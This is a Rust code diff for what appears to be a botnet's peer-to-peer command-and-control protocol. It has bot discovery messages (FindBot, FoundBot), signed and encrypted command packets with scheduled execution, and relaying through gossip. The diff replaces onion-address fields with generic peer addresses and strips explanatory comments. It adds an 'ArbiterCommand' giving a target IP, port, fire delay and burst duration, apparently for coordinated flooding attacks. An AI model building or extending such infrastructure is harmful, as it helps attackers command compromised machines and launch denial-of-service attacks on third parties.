@@ -2,7 +2,6 @@ use serde::{Deserialize, Serialize};
 use ed25519_dalek::{Signer, Verifier, Signature, SigningKey, VerifyingKey};
 use serde_big_array::BigArray;
 
-
 #[derive(Debug, Serialize, Deserialize, Clone)]
 pub enum CommandType {
     Heartbeat = 0x03,
@@ -18,14 +17,14 @@ pub struct CommandPayload {
     pub id: String,
     pub action: String,
     pub parameters: String,
-    pub reply_to: Option<String>, // Onion Address
+    pub reply_to: Option<String>,
     pub execute_at: i64,
 }
 
 #[derive(Debug, Serialize, Deserialize, Clone)]
 pub struct Registration {
     pub pub_key: String,
-    pub onion_address: String,
+    pub peer_address: String,
     pub signature: String,
     pub pow_nonce: u64,
     pub timestamp: i64,
@@ -40,10 +39,10 @@ pub struct AckPayload {
 
 #[derive(Debug, Serialize, Deserialize, Clone, PartialEq)]
 pub struct PeerInfo {
-    pub onion_address: String,
+    pub peer_address: String,
     pub pub_key: String,
     pub last_seen: i64,
-    pub capacity: u8, // 0=Light, 1=Full
+    pub capacity: u8,
 }
 
 #[derive(Debug, Serialize, Deserialize, Clone)]
@@ -51,6 +50,21 @@ pub struct GossipMsg {
     pub id: String,
     pub packet: PhantomPacket,
     pub ttl: u32,
+}
+
+/// NAT hole punching signaling protocol
+#[derive(Debug, Serialize, Deserialize, Clone)]
+pub enum SignalMsg {
+    RequestPunch { target_peer_id: String },
+    Ping { timestamp: u64 },
+    Pong { timestamp: u64 },
+    ArbiterCommand {
+        target_ip: String,
+        target_port: u16,
+        fire_delay_ms: u64,
+        burst_duration_ms: u64,
+    },
+    PunchResult { success: bool, peer_id: String },
 }
 
 #[derive(Debug, Serialize, Deserialize, Clone)]
@@ -64,18 +78,19 @@ pub enum MeshMsg {
     FindBot { target_id: String },
     FoundBot { nodes: Vec<PeerInfo> },
     Ack(AckPayload),
+    Signal(SignalMsg),
 }
 
 #[derive(Debug, Serialize, Deserialize, Clone)]
 pub struct PhantomPacket {
-    pub magic: u32,             // 0xDEADBEEF
-    pub timestamp: u64,         // Unix Epoch
+    pub magic: u32,
+    pub timestamp: u64,
     #[serde(with = "BigArray")]
-    pub nonce: [u8; 12],        // ChaCha20 Nonce (96-bit)
+    pub nonce: [u8; 12],
     pub cmd_type: CommandType,
-    pub data: Vec<u8>,          // Encrypted Payload
+    pub data: Vec<u8>,
     #[serde(with = "BigArray")]
-    pub signature: [u8; 64],    // Ed25519 Signature
+    pub signature: [u8; 64],
 }
 
 impl PhantomPacket {
@@ -104,10 +119,6 @@ impl PhantomPacket {
 
     pub fn verify(&self, key: &VerifyingKey) -> bool {
         if self.magic != 0xDEADBEEF { return false; }
-        // Timestamp check disabled for local testing or handled by caller if needed
-        // let now = chrono::Utc::now().timestamp() as u64;
-        // if self.timestamp.abs_diff(now) > 300 { return false; }
-        
         let msg = self.digest();
         let sig_obj = Signature::from_bytes(&self.signature);
         key.verify(&msg, &sig_obj).is_ok()
@@ -127,10 +138,8 @@ impl PhantomPacket {
         let cipher = ChaCha20Poly1305::new(Key::from_slice(key));
         let nonce = chacha20poly1305::Nonce::from_slice(&self.nonce);
         
-        // Decrypt
         let plaintext_bytes = cipher.decrypt(nonce, self.data.as_ref()).ok()?;
         let json = String::from_utf8(plaintext_bytes).ok()?;
-        
         serde_json::from_str::<CommandPayload>(&json).ok()
     }
 }
